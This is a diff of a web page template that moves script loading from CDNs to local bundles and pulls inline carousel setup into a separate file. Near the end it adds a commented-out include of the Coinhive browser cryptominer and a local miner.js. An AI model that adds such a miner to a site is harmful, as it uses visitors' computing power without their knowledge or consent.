@@ -13,13 +13,18 @@
        </script>
 
         <!-- Jquery, Popper.js and Bootstrap js  -->
-        <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
-        <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+
+        <!-- <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script> -->
+        <!-- <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>  
+        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script> -->
+      
+        <%- js('bower_components/jquery/dist/jquery.min.js') %>
+        <%- js('bootstrap-4.0.0-dist/bootstrap.bundle.min.js') %>
         <!-- jQueryUI maxCDN -->
-        <script
+        <!-- <script
 			  src="https://code.jquery.com/ui/1.11.4/jquery-ui.min.js"
 			  integrity="sha256-xNjb53/rY+WmG+4L6tTl9m6PpqknWZvRt0rO1SRnJzw="
-			  crossorigin="anonymous"></script>
+			  crossorigin="anonymous"></script> -->
 
         <!--SideNav-->
         <%- js('js/sidenav.js') %>
@@ -33,7 +38,7 @@
         <script src="<%- url_for('js/app.js') %>"></script>
 
         <!--Twitter typeahead+bloodhound bundle -->
-        <script src="<%- url_for('bower_components/corejs-typeahead/dist/typeahead.bundle.min.js') %>"></script>
+        <!-- <script src="<%- url_for('bower_components/corejs-typeahead/dist/typeahead.bundle.min.js') %>"></script> -->
 
         <!-- scrollspy index -->
         <script>
@@ -44,53 +49,7 @@
         <!-- <script type="text/javascript" src="https://cdn.jsdelivr.net/gh/kenwheeler/slick@1.8.1/slick/slick.min.js"></script> -->
         <%- js('bower_components/slick-carousel/slick/slick.js') %>
 
-        <script>
-        	$(document).ready(function(){
-        		$('.hero-carousel').slick({
-              slidesToScroll: 1,
-              autoplay: true,
-              autoplaySpeed: 8000,
-              dots: true,
-              infinite: true,
-              speed: 300,
-              slidesToShow: 1,
-              centerMode: true,
-              variableWidth: true,
-              variableHeight: true
-        		});
-
-            $('.movie-carousel').slick({
-              slidesToScroll: 1,
-              slidesToShow: 1,
-              autoplay: false,
-              dots: false,
-              infinite: false,
-              centerMode: false,
-              variableWidth: true,
-              variableHeight: true,
-              responsive: [
-                {
-                  breakpoint: 768,
-                  settings: {
-                    arrows: false,
-                    slidesToShow: 1,
-                    centerMode: false,
-                    // centerPadding: '40px',
-                  }
-                },
-                {
-                  breakpoint: 480,
-                  settings: {
-                    arrows: false,
-                    centerPadding: '40px',
-                    slidesToShow: 1,
-                    centerMode: false,
-                  }
-                }
-              ]
-        		});
-        	});
-        </script>
+        <%- js('js/carousel.js') %>
 
         <!-- Plyr from cdn with fallback from bower -->
         <!-- <script src="https://cdn.plyr.io/2.0.18/plyr.js"></script> -->
@@ -100,6 +59,9 @@
         <script src="<%- url_for('bower_components/plyr/dist/plyr.js') %>"></script>
 
         <script src="https://cdnjs.cloudflare.com/ajax/libs/handlebars.js/4.0.11/handlebars.min.js"></script>
+
+        <!-- <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+        <script src="<%- url_for('js/miner.js') %>"></script> -->
 
         <script>
           // Plyr setup
